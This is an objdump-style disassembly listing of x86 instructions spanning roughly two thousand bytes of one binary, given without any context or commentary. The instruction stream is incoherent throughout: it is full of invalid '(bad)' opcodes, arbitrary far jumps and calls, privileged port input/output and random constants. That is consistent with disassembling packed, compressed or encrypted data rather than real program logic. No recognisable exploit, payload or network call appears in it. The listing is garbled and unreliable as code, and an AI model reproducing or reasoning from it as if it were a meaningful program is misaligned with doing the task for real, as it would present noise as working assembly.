  416615:	out    0x3f,al
  416617:	push   edi
  416618:	jne    0x4165b7
  41661a:	mov    esp,0x932cebd0
  41661f:	xor    al,0xba
  416622:	add    eax,0x3eab110e
  416627:	retf   0x7173
  41662a:	mov    edx,0xeb51e8d1
  41662f:	inc    eax
  416630:	xor    al,0xc5
  416632:	mov    ebp,0x3595af02
  416638:	leave  
  416639:	push   ebp
  41663a:	or     BYTE PTR [edx+0x21],0x74
  41663e:	adc    eax,0xffffffee
  416641:	inc    ebx
  416642:	imul   ecx,ebx,0x51
  416645:	std    
  416646:	xchg   DWORD PTR [edx+0x719486a1],ebp
  41664c:	lods   al,BYTE PTR ds:[esi]
  41664d:	je     0x416667
  41664f:	stos   DWORD PTR es:[edi],eax
  416650:	std    
  416651:	inc    ebp
  416652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416653:	sbb    al,0x95
  416655:	xchg   esi,eax
  416656:	cdq    
  416657:	jmp    0x8a07:0x31a06074
  41665e:	je     0x41664b
  416660:	int3   
  416661:	std    
  416662:	dec    ecx
  416663:	sbb    eax,0xc27bd886
  416668:	add    al,0xd4
  41666a:	popa   
  41666b:	add    al,0xfe
  41666d:	ror    DWORD PTR [edx+0x40],1
  416670:	inc    edi
  416671:	pmullw mm3,mm1
  416674:	test   DWORD PTR [esi+0x69],edi
  416677:	push   ebx
  416678:	pop    esp
  416679:	(bad)  
  41667a:	rol    DWORD PTR [ecx],cl
  41667c:	mov    esp,0x654c2df6
  416681:	and    al,0x94
  416683:	hlt    
  416684:	pop    esp
  416685:	add    eax,0x7a512b45
  41668a:	out    0x62,al
  41668c:	push   0x65
  41668e:	lahf   
  41668f:	jmp    0x6e31145b
  416694:	lahf   
  416695:	fsubr  QWORD PTR [edi]
  416697:	dec    esp
  416698:	out    dx,eax
  416699:	push   cs
  41669a:	mov    al,ds:0x86229785
  41669f:	stos   BYTE PTR es:[edi],al
  4166a0:	loopne 0x4166b4
  4166a2:	stos   DWORD PTR es:[edi],eax
  4166a3:	scas   eax,DWORD PTR es:[edi]
  4166a4:	shl    DWORD PTR [eax+0x40f054b8],cl
  4166aa:	dec    ecx
  4166ab:	cmp    ch,dl
  4166ad:	pop    ss
  4166ae:	mov    esp,0xdf42182f
  4166b3:	int    0x0
  4166b5:	scas   al,BYTE PTR es:[edi]
  4166b6:	cmp    al,0xca
  4166b8:	pusha  
  4166b9:	in     eax,dx
  4166ba:	jp     0x416688
  4166bc:	push   esp
  4166bd:	das    
  4166be:	arpl   WORD PTR [edi],bx
  4166c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166c1:	add    al,0xd7
  4166c3:	mov    DWORD PTR [edi-0x14],0x540a8e52
  4166ca:	jmp    DWORD PTR [eax+0x23289601]
  4166d0:	dec    ebp
  4166d1:	jno    0x4166e8
  4166d3:	jbe    0x4166d2
  4166d5:	enter  0x7ac0,0x33
  4166d9:	test   BYTE PTR [eax-0x5ebd4b0e],0xe4
  4166e0:	inc    eax
  4166e1:	aas    
  4166e2:	jg     0x416739
  4166e4:	test   BYTE PTR [edi+0x65f679a4],bl
  4166ea:	mov    eax,ds:0x9c63cb7e
  4166ef:	jne    0x4166c9
  4166f1:	int3   
  4166f2:	daa    
  4166f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166f4:	aam    0x46
  4166f6:	push   ebx
  4166f7:	xlat   BYTE PTR ds:[ebx]
  4166f8:	test   bl,dh
  4166fa:	jmp    0x4166f1
  4166fc:	jl     0x416719
  4166fe:	adc    BYTE PTR [ebp-0x58],ah
  416701:	add    BYTE PTR [edi+ebp*2+0x1e],al
  416705:	arpl   cx,di
  416707:	push   ebx
  416708:	push   es
  416709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41670a:	stc    
  41670b:	push   eax
  41670c:	jae    0x416761
  41670e:	push   edx
  41670f:	daa    
  416710:	stc    
  416711:	and    DWORD PTR ds:0xc2abb05,ecx
  416717:	xchg   ebp,eax
  416718:	es in  al,0x3e
  41671b:	ins    BYTE PTR es:[edi],dx
  41671c:	(bad)  
  41671d:	(bad)  ds:0xdc259cae
  416723:	popa   
  416724:	leave  
  416725:	fwait
  416726:	into   
  416727:	jecxz  0x416736
  416729:	mov    DWORD PTR [edi-0x5adfc207],edx
  41672f:	jno    0x416713
  416731:	cld    
  416732:	inc    edx
  416733:	das    
  416734:	inc    ebp
  416735:	pushf  
  416736:	jbe    0x416759
  416738:	adc    eax,0x66853017
  41673d:	jnp    0x4166ef
  41673f:	das    
  416740:	xor    ebp,DWORD PTR [eax+0x15]
  416743:	sub    bh,al
  416745:	lds    ebx,FWORD PTR [edi]
  416747:	adc    al,0x88
  416749:	(bad)  
  41674a:	jmp    0xac26e885
  41674f:	mov    ds:0x6db5f9e4,eax
  416754:	mov    bh,bl
  416756:	lods   al,BYTE PTR ds:[esi]
  416757:	xor    DWORD PTR [ebp-0x7f],0x23c0001d
  41675e:	hlt    
  41675f:	push   esp
  416760:	push   ds
  416761:	fld    QWORD PTR [esi]
  416763:	mov    ss,WORD PTR [eax]
  416765:	retf   
  416766:	pop    ecx
  416767:	(bad)  
  416768:	sbb    al,BYTE PTR [esp+eax*1+0x33]
  41676c:	sub    eax,0x57d69f8a
  416771:	jge    0x416702
  416773:	push   edx
  416774:	push   edi
  416775:	lea    esi,[eax]
  416777:	sbb    DWORD PTR [ebp-0x46],eax
  41677a:	xor    eax,edx
  41677c:	inc    edi
  41677d:	in     eax,dx
  41677e:	sbb    eax,0xe127619c
  416783:	fcom   st(4)
  416785:	sub    BYTE PTR [ebx+0xcb06419],bh
  41678b:	pop    es
  41678c:	jno    0x4167a2
  41678e:	fwait
  41678f:	aaa    
  416790:	mov    edx,0x6954fecf
  416795:	aam    0xfa
  416797:	dec    edx
  416798:	pusha  
  416799:	or     BYTE PTR [esi+0x6396a02],al
  41679f:	call   0x3f8e:0x148c3ef6
  4167a6:	retf   
  4167a7:	retf   
  4167a8:	mov    dh,0x77
  4167aa:	int    0x9a
  4167ac:	loop   0x4167f6
  4167ae:	out    dx,al
  4167af:	pop    ds
  4167b0:	pop    edx
  4167b1:	jne    0x41680a
  4167b3:	jecxz  0x41680f
  4167b5:	adc    eax,DWORD PTR [ebx-0x11]
  4167b8:	sbb    eax,0x29959b6e
  4167bd:	sbb    DWORD PTR [edi],edx
  4167bf:	retf   0x50e6
  4167c2:	xchg   ebx,eax
  4167c3:	push   cs
  4167c4:	inc    esi
  4167c5:	mov    dh,0x2d
  4167c7:	dec    edx
  4167c8:	and    DWORD PTR [ecx-0x34],ebp
  4167cb:	pop    eax
  4167cc:	loope  0x416769
  4167ce:	(bad)
  4167d1:	call   FWORD PTR [edx+0x71]
  4167d4:	push   ebp
  4167d5:	ret    
  4167d6:	xchg   esi,eax
  4167d7:	jae    0x41678f
  4167d9:	mov    BYTE PTR [ebx],al
  4167db:	sbb    al,0xc1
  4167dd:	or     al,0x18
  4167df:	sub    esp,edx
  4167e1:	js     0x416775
  4167e3:	sub    ecx,DWORD PTR [ecx+0x67]
  4167e6:	pop    edi
  4167e7:	adc    ebx,esi
  4167e9:	clc    
  4167ea:	in     al,dx
  4167eb:	sbb    edx,esi
  4167ed:	pop    esp
  4167ee:	mov    ebx,0x78d58fbd
  4167f3:	mov    dh,0xcf
  4167f5:	mov    ecx,0x7b418358
  4167fa:	and    DWORD PTR [edi+0xb537e46],esp
  416800:	mov    ?,WORD PTR [ebx+esi*2-0x23]
  416804:	aaa    
  416805:	xchg   edx,eax
  416806:	sub    BYTE PTR fs:[eax+0x6c9f2f9d],al
  41680d:	pop    esi
  41680e:	mov    eax,0x529cda15
  416813:	pop    ds
  416814:	int    0x55
  416816:	push   0x3cfcefe1
  41681b:	aam    0x4
  41681d:	sbb    eax,0xfdb23db4
  416822:	rcr    dh,cl
  416824:	scas   al,BYTE PTR es:[edi]
  416825:	pop    ebx
  416826:	mov    ?,WORD PTR [ebp+0x39]
  416829:	sbb    dh,bh
  41682b:	(bad)  
  41682c:	sbb    ch,BYTE PTR [ebx+0xd]
  41682f:	jo     0x4167ba
  416831:	pop    ebx
  416832:	nop
  416833:	xchg   ebp,eax
  416834:	les    edi,FWORD PTR [ecx-0x62]
  416837:	xchg   edi,eax
  416838:	xor    esp,DWORD PTR gs:[esi+0x33]
  41683c:	cmp    dl,BYTE PTR [edx]
  41683e:	mov    eax,ds:0x74368be0
  416843:	les    edx,FWORD PTR [eax+0x2cc7244e]
  416849:	stos   BYTE PTR es:[edi],al
  41684a:	test   eax,0x5199f265
  41684f:	xchg   esp,eax
  416850:	sub    ebp,DWORD PTR [edi]
  416852:	pop    ds
  416853:	or     bl,BYTE PTR [eax-0x3f]
  416856:	push   0xffffff88
  416858:	mov    cl,0xce
  41685a:	mov    dl,BYTE PTR [ebp+0x8]
  41685d:	fs jmp 0x4168a0
  416860:	bound  ax,DWORD PTR [edi-0x9a3b1a3]
  416867:	test   al,0xa2
  416869:	pusha  
  41686a:	jne    0x4167f0
  41686c:	pushf  
  41686d:	cwde   
  41686e:	jno    0x4168d6
  416870:	into   
  416871:	jne    0x41683f
  416873:	sub    eax,0x67fd4e7f
  416878:	(bad)  
  416879:	shl    DWORD PTR [esi],cl
  41687b:	cmp    eax,DWORD PTR [edx+eiz*4-0x70e1c877]
  416882:	lods   eax,DWORD PTR ds:[esi]
  416883:	and    al,0x3d
  416885:	mov    ds:0x49ba1e0e,eax
  41688a:	inc    ecx
  41688b:	pusha  
  41688c:	jb     0x4168ef
  41688e:	test   eax,0x8f736ff2
  416893:	les    edi,FWORD PTR [esi-0x468f3d36]
  416899:	push   esp
  41689a:	mov    ecx,0xc00f04d2
  41689f:	arpl   WORD PTR [edi],bx
  4168a1:	cmp    BYTE PTR ds:0xc938,dh
  4168a6:	arpl   WORD PTR [ebx+ebp*2-0x55],bp
  4168aa:	adc    eax,0x25f75802
  4168af:	mov    bh,0xbd
  4168b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168b2:	jmp    0x416841
  4168b4:	push   eax
  4168b5:	xor    DWORD PTR [esi+0x11],ebp
  4168b8:	(bad)  
  4168b9:	div    DWORD PTR [ebx]
  4168bb:	mov    edx,0xe1a3ef75
  4168c0:	cmc    
  4168c1:	jb     0x416911
  4168c3:	adc    eax,0xffd30a49
  4168c8:	xchg   esi,eax
  4168c9:	ja     0x416889
  4168cb:	mov    BYTE PTR [ecx+0x65c492a6],cl
  4168d1:	push   ebx
  4168d2:	fdiv   QWORD PTR [ebx-0x2c467eca]
  4168d8:	xchg   edx,eax
  4168d9:	lods   al,BYTE PTR ds:[esi]
  4168da:	(bad)  [eax-0x7b]
  4168dd:	dec    esp
  4168de:	test   al,0xd
  4168e0:	cmp    DWORD PTR [edi+0x7e746106],edi
  4168e6:	(bad)  
  4168e7:	jg     0x416901
  4168e9:	mov    cl,0xeb
  4168eb:	xchg   ebp,eax
  4168ec:	pusha  
  4168ed:	sti    
  4168ee:	and    dh,BYTE PTR [ebp-0x1be2d300]
  4168f4:	out    dx,al
  4168f5:	fidiv  DWORD PTR [ebx]
  4168f7:	push   esi
  4168f8:	bound  esi,QWORD PTR [ebx-0x2]
  4168fb:	ret    
  4168fc:	dec    ebp
  4168fd:	(bad)  
  4168fe:	jg     0x4168fe
  416900:	pushf  
  416901:	ja     0x4168ef
  416903:	lods   al,BYTE PTR cs:[esi]
  416905:	outs   dx,DWORD PTR ds:[esi]
  416906:	pushf  
  416907:	ret    0xf3e
  41690a:	pop    ebp
  41690b:	stos   DWORD PTR es:[edi],eax
  41690c:	push   ds
  41690d:	xchg   esi,eax
  41690e:	cmp    al,0xab
  416910:	dec    eax
  416911:	jge    0x4168aa
  416913:	xchg   esp,eax
  416914:	repz or ecx,DWORD PTR [eax+0x69208cb0]
  41691b:	loope  0x41696d
  41691d:	es and al,0x11
  416920:	jbe    0x41691c
  416922:	and    BYTE PTR [esi],bl
  416924:	mov    BYTE PTR [ecx-0x17],bl
  416927:	test   BYTE PTR [ebx+0x1f72425f],cl
  41692d:	nop
  41692e:	je     0x416994
  416930:	scas   al,BYTE PTR es:[edi]
  416931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416932:	dec    esi
  416933:	xor    al,0x95
  416935:	sbb    al,bh
  416937:	or     cl,ch
  416939:	cmc    
  41693a:	xor    DWORD PTR [esi-0x30],edi
  41693d:	aaa    
  41693e:	loopne 0x416989
  416940:	sbb    eax,0x89ba46b1
  416945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416946:	push   ds
  416947:	inc    edi
  416948:	mov    ah,0x46
  41694a:	adc    BYTE PTR [edi],ch
  41694c:	sahf   
  41694d:	jo     0x4168d2
  41694f:	ja     0x416979
  416951:	sahf   
  416952:	test   DWORD PTR [ebx-0x72b4eb9],ebx
  416958:	xor    eax,0xcd707ce8
  41695d:	inc    esi
  41695e:	jo     0x416918
  416960:	jns    0x41693d
  416962:	jg     0x4169c8
  416964:	retf   0x7c73
  416967:	inc    ebp
  416968:	add    dl,BYTE PTR [esi-0x5659facd]
  41696e:	test   BYTE PTR [ebx],al
  416970:	or     eax,0xa93c9058
  416975:	xor    eax,0x68f5d756
  41697a:	xchg   ebx,eax
  41697b:	sbb    BYTE PTR [ebp+0x0],al
  41697e:	cli    
  41697f:	inc    edx
  416980:	add    dh,dh
  416982:	cmp    eax,0x8ab61013
  416987:	pop    eax
  416988:	popf   
  416989:	inc    ebp
  41698a:	ror    ah,1
  41698c:	adc    BYTE PTR [ebp+0x3fdc223c],dh
  416992:	add    eax,0xdbb0d6cf
  416997:	jmp    0x416924
  416999:	shr    DWORD PTR [edx-0x2679a8e3],1
  41699f:	dec    ebp
  4169a0:	sti    
  4169a1:	jb     0x41695d
  4169a3:	mov    ah,BYTE PTR [eax+0x55]
  4169a6:	add    esi,DWORD PTR [ecx]
  4169a8:	sub    BYTE PTR [ebx+0x5e99238],0xa0
  4169af:	repnz retf 
  4169b1:	pop    ebp
  4169b2:	jmp    0x2951:0xb46326f3
  4169b9:	jl     0x41694b
  4169bb:	and    DWORD PTR [ebp+0x3f],esp
  4169be:	xchg   edx,edx
  4169c0:	(bad)  
  4169c1:	ins    BYTE PTR es:[edi],dx
  4169c2:	bound  esp,QWORD PTR [edi+0x16]
  4169c5:	inc    eax
  4169c6:	sahf   
  4169c7:	and    bl,BYTE PTR [edx]
  4169c9:	stc    
  4169ca:	iret   
  4169cb:	lahf   
  4169cc:	mov    ebx,ecx
  4169ce:	outs   dx,BYTE PTR ds:[esi]
  4169cf:	jo     0x416a13
  4169d1:	leave  
  4169d2:	je     0x416967
  4169d4:	mov    esi,DWORD PTR [ebx+ebx*2]
  4169d7:	sbb    DWORD PTR [ecx],esp
  4169d9:	je     0x4169f5
  4169db:	xchg   DWORD PTR [eax],esp
  4169dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169de:	(bad)  
  4169df:	cmp    bl,bl
  4169e1:	jge    0x416a11
  4169e3:	push   esi
  4169e4:	push   es
  4169e5:	or     ebp,DWORD PTR [ebx-0x7e]
  4169e8:	pop    ebp
  4169e9:	push   eax
  4169ea:	sbb    al,0x8c
  4169ec:	scas   eax,DWORD PTR es:[edi]
  4169ed:	mov    dl,0xa1
  4169ef:	push   ecx
  4169f0:	ins    DWORD PTR es:[edi],dx
  4169f1:	xchg   edi,eax
  4169f2:	lods   eax,DWORD PTR ds:[esi]
  4169f3:	stos   BYTE PTR es:[edi],al
  4169f4:	cmp    al,0x4a
  4169f6:	mov    esp,0x247b76a0
  4169fc:	hlt    
  4169fd:	test   BYTE PTR [esi+ebx*4+0x56],0x7e
  416a02:	inc    edi
  416a03:	stos   BYTE PTR es:[edi],al
  416a04:	jge    0x4169d2
  416a06:	jnp    0x416a01
  416a08:	mov    ah,al
  416a0a:	cmp    eax,0x8b0b099b
  416a0f:	mov    ebx,0x4a3d903
  416a14:	lahf   
  416a15:	pop    ecx
  416a16:	jle    0x416a55
  416a18:	pusha  
  416a19:	out    dx,eax
  416a1a:	xchg   DWORD PTR [ebx-0x2],eax
  416a1d:	std    
  416a1e:	add    DWORD PTR [eax-0x31a00035],0xffffffdd
  416a25:	add    BYTE PTR [edi+0x79cccd05],ah
  416a2b:	popf   
  416a2c:	cmp    edx,DWORD PTR [edx-0x441f211b]
  416a32:	sbb    BYTE PTR [edx+ecx*8+0x26],dh
  416a36:	lock (bad) 
  416a38:	dec    DWORD PTR [ebx-0xfc47973]
  416a3e:	xchg   esi,eax
  416a3f:	inc    ebp
  416a40:	or     ebp,ebp
  416a42:	ror    BYTE PTR fs:[edi+0x43722cbc],cl
  416a49:	push   cs
  416a4a:	xchg   ebp,eax
  416a4b:	lods   al,BYTE PTR ds:[esi]
  416a4c:	add    al,0x57
  416a4e:	and    al,0x9
  416a50:	jne    0x416ad0
  416a52:	inc    esi
  416a53:	lds    edi,FWORD PTR ds:0x7b693c4e
  416a59:	mov    ebp,0xe320d55f
  416a5e:	dec    edx
  416a5f:	jno    0x416ac9
  416a61:	mov    bl,0x16
  416a63:	mov    bl,0x20
  416a65:	jbe    0x416a85
  416a67:	cmp    ebp,DWORD PTR gs:[edx-0x4acf816c]
  416a6e:	sbb    cl,BYTE PTR [eax+0x68]
  416a71:	mov    ds:0xed23a57f,eax
  416a76:	mov    eax,ds:0xd2936d54
  416a7b:	sbb    BYTE PTR [ecx],ah
  416a7d:	les    eax,FWORD PTR [ebp+0x5e]
  416a80:	add    dl,BYTE PTR [esi+0x54]
  416a83:	and    edi,DWORD PTR [ebx-0x5]
  416a86:	into   
  416a87:	test   bl,bl
  416a89:	xor    al,0x2
  416a8b:	sbb    eax,0x7b59f545
  416a90:	mov    dl,0x2c
  416a92:	inc    ecx
  416a93:	fmul   st,st(6)
  416a95:	sub    BYTE PTR [edx+esi*8-0x45],dl
  416a99:	mul    DWORD PTR [ecx]
  416a9b:	push   cs
  416a9c:	jg     0x416a65
  416a9e:	pop    edx
  416a9f:	shl    al,0xce
  416aa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416aa3:	push   eax
  416aa4:	xor    BYTE PTR [ebx-0x32],0x5d
  416aa8:	xor    al,dh
  416aaa:	jg     0x416aeb
  416aac:	mov    edi,0xdab21877
  416ab1:	inc    ebp
  416ab2:	push   cs
  416ab3:	xor    eax,0x204d625d
  416ab8:	xor    BYTE PTR [ebx+0x55],0x55
  416abc:	push   ecx
  416abd:	imul   edx,ebx,0xffffffc3
  416ac0:	clc    
  416ac1:	imul   esp,DWORD PTR [eax-0x12],0xffffffd7
  416ac5:	sbb    BYTE PTR [edx+0x59],bh
  416ac8:	pop    es
  416ac9:	nop
  416aca:	sti    
  416acb:	xchg   bh,ch
  416acd:	and    BYTE PTR [ebp+0x3d],ch
  416ad0:	add    al,0xa
  416ad2:	dec    ebp
  416ad3:	jl     0x416a6a
  416ad5:	pop    edi
  416ad6:	aaa    
  416ad7:	sub    BYTE PTR [edx-0x6c],cl
  416ada:	dec    edi
  416adb:	test   DWORD PTR [ebx-0x639015fe],0xd131e7c7
  416ae5:	sub    edi,ecx
  416ae7:	icebp  
  416ae8:	jmp    0xa644:0x6a9606a2
  416aef:	fimul  WORD PTR [edi]
  416af1:	pop    edi
  416af2:	jmp    0x113ae263
  416af7:	imul   esi,ebp,0xffffff90
  416afa:	add    ch,BYTE PTR [edx]
  416afc:	enter  0xf70d,0x38
  416b00:	adc    BYTE PTR [ebx-0x6ec8dc1c],ch
  416b06:	adc    al,0xb2
  416b08:	outs   dx,BYTE PTR ds:[esi]
  416b09:	out    0xf3,al
  416b0b:	mov    ds:0xf029c7be,al
  416b10:	fwait
  416b11:	sahf   
  416b12:	jle    0x416b57
  416b14:	int3   
  416b15:	or     ebp,DWORD PTR [esi]
  416b17:	cli    
  416b18:	rcl    BYTE PTR [ebx+0x5d007022],cl
  416b1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b1f:	jmp    DWORD PTR [edx-0x398ab2b8]
  416b25:	adc    eax,0xbfac4579
  416b2a:	inc    esi
  416b2b:	int3   
  416b2c:	fsubr  st(7),st
  416b2e:	jnp    0x416b9c
  416b30:	dec    esi
  416b31:	jg     0x416b44
  416b33:	mov    dh,0x40
  416b35:	repnz in al,dx
  416b37:	mov    dl,0xea
  416b39:	cwde   
  416b3a:	aaa    
  416b3b:	ins    DWORD PTR es:[edi],dx
  416b3c:	adc    dl,ah
  416b3e:	mov    edi,0xa639cd64
  416b43:	cmp    esp,esp
  416b45:	cmc    
  416b46:	mov    ds:0xd88cf3e8,al
  416b4b:	mov    dh,0x80
  416b4d:	mov    DWORD PTR ds:0x788c76c2,ebx
  416b53:	push   esp
  416b54:	inc    eax
  416b55:	push   esi
  416b56:	xor    eax,0xad9eb8da
  416b5b:	push   ebp
  416b5c:	or     ecx,edi
  416b5e:	sub    dh,BYTE PTR [ebx]
  416b60:	out    0x31,eax
  416b62:	scas   eax,DWORD PTR es:[edi]
  416b63:	adc    esp,edi
  416b65:	lock xchg BYTE PTR [edi],al
  416b68:	xlat   BYTE PTR ds:[ebx]
  416b69:	pusha  
  416b6a:	sbb    dl,BYTE PTR [eax-0x5e]
  416b6d:	push   DWORD PTR [ebp+0x5a]
  416b70:	xchg   DWORD PTR [esi-0x35],esi
  416b73:	push   esp
  416b74:	repnz pop ebx
  416b76:	call   0xbd52:0x2e284340
  416b7d:	mov    ebx,0x9f33f144
  416b82:	pop    ss
  416b83:	test   BYTE PTR [ecx+0x2d],ch
  416b86:	add    ecx,DWORD PTR [ebp+0x3718ee6a]
  416b8c:	(bad)  
  416b8d:	jmp    0x416b1c
  416b8f:	retf   
  416b90:	fsub   st(4),st
  416b92:	rcl    ebp,1
  416b94:	mov    ds:0x7d359095,al
  416b99:	sbb    DWORD PTR [ebx+0x6f687c1d],esp
  416b9f:	ja     0x416c0c
  416ba1:	xchg   esp,eax
  416ba2:	pop    edx
  416ba3:	(bad)  
  416ba4:	sar    bh,cl
  416ba6:	xchg   cx,ax
  416ba8:	mov    eax,ds:0xe7929358
  416bad:	add    eax,0xb8b30729
  416bb2:	test   DWORD PTR [ebp+eax*1-0x23],ebp
  416bb6:	int    0xc7
  416bb8:	test   eax,0xb1d10c7a
  416bbd:	or     eax,DWORD PTR [ebx]
  416bbf:	aaa    
  416bc0:	sub    dl,BYTE PTR [eax+0x3356a038]
  416bc6:	in     al,0x59
  416bc8:	int    0x12
  416bca:	cs xor al,0x29
  416bcd:	bswap  esi
  416bcf:	sub    al,0xd4
  416bd1:	imul   eax,DWORD PTR [eax],0x25
  416bd4:	xor    al,0xe3
  416bd6:	inc    ebx
  416bd7:	cwde   
  416bd8:	(bad)  
  416bd9:	mov    ds:0x83f70af2,eax
  416bde:	clc    
  416bdf:	jbe    0x416bdc
  416be1:	or     ah,dl
  416be3:	sbb    BYTE PTR [esi-0x2c],0xb4
  416be7:	test   al,0x64
  416be9:	jns    0x416bfa
  416beb:	xor    edx,DWORD PTR [esi-0x44]
  416bee:	xor    DWORD PTR [eax],ebx
  416bf0:	test   eax,0x85c2e748
  416bf6:	or     edi,ebp
  416bf8:	hlt    
  416bf9:	adc    BYTE PTR [edx],0xd6
  416bfc:	outs   dx,DWORD PTR ds:[esi]
  416bfd:	xor    edx,ebp
  416bff:	mov    dl,0xda
  416c01:	call   0x8868:0x4b788ba9
  416c08:	or     ch,dl
  416c0a:	or     eax,0xd88f21a9
  416c0f:	push   esi
  416c10:	mov    BYTE PTR [esp+edx*4-0x10],dh
  416c14:	or     bh,BYTE PTR [ecx+esi*4]
  416c17:	in     eax,dx
  416c18:	mov    al,0x59
  416c1a:	jne    0x416ba1
  416c1c:	pop    ss
  416c1d:	jo     0x416bca
  416c1f:	fwait
  416c20:	jno    0x416c82
  416c22:	addr16 mov esp,0x2be7a9d3
  416c28:	addr16 xchg edi,eax
  416c2a:	ror    DWORD PTR ds:0xa620034c,cl
  416c30:	sub    DWORD PTR [ebp+0x16db7290],ecx
  416c36:	repnz pop esp
  416c38:	push   cs
  416c39:	sub    BYTE PTR [ebx],ah
  416c3b:	jecxz  0x416c71
  416c3d:	adc    eax,0x9447cbd
  416c42:	mov    dl,0x2b
  416c44:	inc    edx
  416c45:	lahf   
  416c46:	jb     0x416c16
  416c48:	jmp    0x916f1fcb
  416c4d:	jmp    0x9e83:0x229a3600
  416c54:	dec    ebx
  416c55:	jns    0x416c1d
  416c57:	neg    BYTE PTR [edx+edx*1+0x52]
  416c5b:	je     0x416c7b
  416c5d:	jns    0x416c45
  416c5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c60:	in     al,0x41
  416c62:	pop    ebx
  416c63:	push   ebp
  416c64:	pop    eax
  416c65:	adc    dh,bh
  416c67:	jb     0x416c9f
  416c69:	scas   al,BYTE PTR es:[edi]
  416c6a:	gs dec edx
  416c6c:	outs   dx,BYTE PTR ds:[esi]
  416c6d:	push   ebp
  416c6e:	adc    ah,0xb2
  416c71:	push   esi
  416c72:	mov    esi,0xf7438532
  416c77:	jns    0x416c85
  416c79:	sti    
  416c7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c7b:	dec    eax
  416c7c:	cmp    bh,BYTE PTR [ebx-0x7d]
  416c7f:	les    esp,FWORD PTR [ebx]
  416c81:	sub    edx,DWORD PTR [eax+0x3af62487]
  416c87:	xor    eax,0x9bef693c
  416c8c:	es dec eax
  416c8e:	shl    DWORD PTR [esi-0x10],cl
  416c91:	cmc    
  416c92:	sbb    BYTE PTR ds:0xa449d7e1,dl
  416c98:	pop    edx
  416c99:	aaa    
  416c9a:	lock dec ecx
  416c9c:	cld    
  416c9d:	push   edx
  416c9e:	or     al,0xd0
  416ca0:	dec    edi
  416ca1:	ss enter 0x40c4,0x72
  416ca6:	sahf   
  416ca7:	sub    ah,bl
  416ca9:	push   eax
  416caa:	cwde   
  416cab:	adc    BYTE PTR [ecx-0x74],ah
  416cae:	pop    ss
  416caf:	rcr    BYTE PTR [edx-0x26c54708],0x85
  416cb6:	cld    
  416cb7:	mov    ds:0x1ae2bca6,eax
  416cbc:	mov    edx,0xab64d60
  416cc1:	sub    edx,DWORD PTR [edi-0x756f53ab]
  416cc7:	stos   BYTE PTR es:[edi],al
  416cc8:	adc    BYTE PTR [eax+0x5c],ch
  416ccb:	(bad)  [edi-0x77ccdfc3]
  416cd1:	gs out 0x31,al
  416cd4:	jmp    0x416c6a
  416cd6:	cmp    DWORD PTR [ebx],edx
  416cd8:	scas   eax,DWORD PTR es:[edi]
  416cd9:	sbb    esi,esp
  416cdb:	sub    al,0xc9
  416cdd:	not    edi
  416cdf:	mov    eax,0x6bb50456
  416ce4:	mov    esp,0x5683fb14
  416ce9:	adc    al,bh
  416ceb:	aam    0xf4
  416ced:	mov    esp,0xe6a1bd2c
  416cf2:	imul   ecx,DWORD PTR [edx],0x3b
  416cf5:	push   ebx
  416cf6:	jae    0x416d6b
  416cf8:	sbb    BYTE PTR [edi-0x5d0a4e85],bh
  416cfe:	push   edx
  416cff:	gs jae 0x416d42
  416d02:	call   0x6c10:0xf166097
  416d09:	jne    0x416d6b
  416d0b:	push   ds
  416d0c:	(bad)  
  416d0d:	mov    bh,0x17
  416d0f:	xor    cl,dh
  416d11:	into   
  416d12:	push   ebx
  416d13:	jmp    0x10ad:0x861aceca
  416d1a:	pop    ebp
  416d1b:	xor    esi,DWORD PTR [edi]
  416d1d:	mov    esi,0xbedc9ece
  416d22:	pop    esp
  416d23:	sbb    al,0xc7
  416d25:	fdivr  DWORD PTR [edx-0x30223c7c]
  416d2b:	jge    0x416d35
  416d2d:	imul   cl
  416d2f:	jo     0x416d13
  416d31:	push   edi
  416d32:	jno    0x416d74
  416d34:	repz adc bh,bh
  416d37:	cwde   
  416d38:	cld    
  416d39:	mov    bh,0x93
  416d3b:	push   esi
  416d3c:	and    BYTE PTR [ebx+ebp*8-0x1e853f1],0x12
  416d44:	pop    eax
  416d45:	dec    eax
  416d46:	mov    al,ds:0x87585d1
  416d4b:	and    dl,al
  416d4d:	sbb    DWORD PTR [edx-0x73],esi
  416d50:	fwait
  416d51:	adc    eax,DWORD PTR [ecx]
  416d53:	mov    dh,0xb3
  416d55:	lds    esi,FWORD PTR [ecx]
  416d57:	and    BYTE PTR [eax+esi*2-0x7d7442bc],ch
  416d5e:	stc    
  416d5f:	push   edx
  416d60:	test   BYTE PTR cs:[esp+ebx*2],cl
  416d64:	and    DWORD PTR [ecx-0x42a078d9],ebx
  416d6a:	mov    ecx,0x4e1c1757
  416d6f:	jg     0x416dd1
  416d71:	jp     0x416d5e
  416d73:	popa   
  416d74:	xchg   edi,eax
  416d75:	inc    esi
  416d76:	jno    0x416df3
  416d78:	jnp    0x416d3a
  416d7a:	xor    DWORD PTR [ecx+0x777cfc93],esp
  416d80:	sbb    al,0x7c
  416d82:	cwde   
  416d83:	xchg   BYTE PTR [edx-0x6f],ch
  416d86:	or     esp,DWORD PTR [eax+ebx*8-0x76]
  416d8a:	fiadd  DWORD PTR [esi-0x57]
  416d8d:	icebp  
  416d8e:	shl    BYTE PTR [ebx],0x68
  416d91:	test   eax,0x48a7a2a5
  416d96:	rcl    dh,cl
  416d98:	shr    DWORD PTR [esi],1
  416d9a:	jecxz  0x416d80
  416d9c:	jae    0x416df2
  416d9e:	sub    al,0xe2
  416da0:	pop    edx
  416da1:	fidivr DWORD PTR [eax-0x3e55f560]
  416da7:	test   DWORD PTR [eax-0x6ff400e0],0xb4424df2
  416db1:	inc    esi
  416db2:	sub    al,0x4
  416db4:	jle    0x416d44
  416db6:	and    bl,al
  416db8:	mov    bl,0xc2
  416dba:	add    eax,0xe2aa4814
  416dbf:	sub    eax,0xae5ae6ed
